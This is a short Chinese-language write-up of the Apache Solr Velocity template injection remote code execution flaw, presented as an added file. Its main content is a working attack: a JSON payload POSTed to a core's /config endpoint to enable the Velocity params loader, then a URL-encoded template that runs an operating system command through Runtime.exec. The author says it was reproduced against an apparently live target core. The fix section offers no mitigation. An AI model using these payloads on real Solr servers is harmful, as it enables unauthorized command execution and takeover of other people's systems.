@@ -1,0 +1,80 @@
+
+
+0x00简介
+
+Apache Solr是一个高度可靠、可伸缩和容错的，提供分布式索引、复制和负载平衡查询、自动故障转移和恢复、集中配置等功能的开源的搜索服务器。Solr为世界上许多最大的互联网站点提供搜索和导航功能。
+
+0x01影响范围
+
+漏洞名称：Apache Solr远程代码执行漏洞
+
+威胁等级：高危
+
+Apache Solr 5.x - 8.2.0，存在config API版本
+
+0x02漏洞描述
+
+该漏洞本质是ConfigAPI允许通过HTTP POST请求进行配置。
+
+ 
+
+攻击者可以通过ConfigAPI对VelocityResponseWriter组件进行配置，将params.resource.loader.enabled设置为true。通过Velocity模板注入，实现远程代码执行漏洞的利用。
+
+0x03进攻复现
+
+                                               1-1
+
+我们首先得知道Solr服务中Core的名称
+
+如图1-1所示 即为Core名称
+
+接着构造POST请求，在/solr/Core名称/config目录POST以下数据（修改Core的配置）
+
+如我现在实战的名称 POST: /solr/group-buy-captain/config
+
+ 
+
+打开Burpsuite抓POST包 填入:
+
+ 
+
+{ 
+
+ "update-queryresponsewriter": {    
+
+"startup": "lazy",   
+
+"name": "velocity",    
+
+"class": 
+
+"solr.VelocityResponseWriter",    
+
+"template.base.dir":"",    
+
+"solr.resource.loader.enabled": "true",    
+
+"params.resource.loader.enabled": "true"  
+
+}
+
+}
+
+
+                                 1-2
+
+ 
+
+最后我们就可以使用已经公开的exp进行利用了
+
+ 
+
+/solr/Core名称/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+
+ 
+
+ 
+
+0x04修复建议
+
+官方尚未发布相应补丁
